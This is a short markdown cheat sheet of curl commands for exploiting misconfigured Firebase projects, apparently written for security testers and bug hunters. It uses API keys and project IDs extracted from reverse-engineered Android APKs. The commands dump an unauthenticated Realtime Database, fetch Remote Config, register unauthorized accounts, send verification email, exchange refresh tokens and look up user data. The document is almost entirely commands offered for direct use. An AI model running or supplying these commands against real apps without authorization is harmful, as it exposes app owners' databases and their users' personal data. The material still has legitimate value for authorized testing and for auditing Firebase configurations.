# Firebase Vulnerability Exploitation via cURL

This document provides a list of `cURL` commands to exploit various Firebase vulnerabilities identified using tools like `firebase-checker.py`.

---

## 🔓 1. Open Firebase Database (Unauthenticated Access)

```bash
curl https://<project-id>.firebaseio.com/.json
```

> Replace `<project-id>` with the Firebase project ID or domain extracted from the APK.

---

## 🛠 2. Firebase Remote Config Misconfiguration

```bash
curl -X POST "https://firebaseremoteconfig.googleapis.com/v1/projects/<project-id>/namespaces/firebase:fetch?key=<google-api-key>" \
  -H "Content-Type: application/json" \
  -d '{"appId": "1:<project-id>:android:<randomid>", "appInstanceId": "required_but_unused_value"}'
```

> Replace:
> - `<project-id>` with the actual Firebase project ID.
> - `<google-api-key>` with the Google API key from the APK.

---

## 👤 3. Unauthorized Firebase Signup

```bash
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<google-api-key>" \
  -H "Content-Type: application/json" \
  -d '{"email":"yourtestemail@example.com","password":"Test@Pass123","returnSecureToken":true}'
```

---

## 📩 4. Send Email Verification (After Signup)

```bash
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<google-api-key>" \
  -H "Content-Type: application/json" \
  -d '{"requestType":"VERIFY_EMAIL","idToken":"<idToken>"}'
```

---

## 🔁 5. Exchange Refresh Token for Access Token

```bash
curl -X POST "https://securetoken.googleapis.com/v1/token?key=<google-api-key>" \
  -H "Content-Type: application/json" \
  -d '{"grant_type":"refresh_token","refresh_token":"<refreshToken>"}'
```

---

## 👀 6. Lookup User Info Using ID Token

```bash
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=<google-api-key>" \
  -H "Content-Type: application/json" \
  -d '{"idToken":"<idToken>"}'
```

---

> Be sure to replace all placeholders with actual values obtained from reverse-engineering APKs.
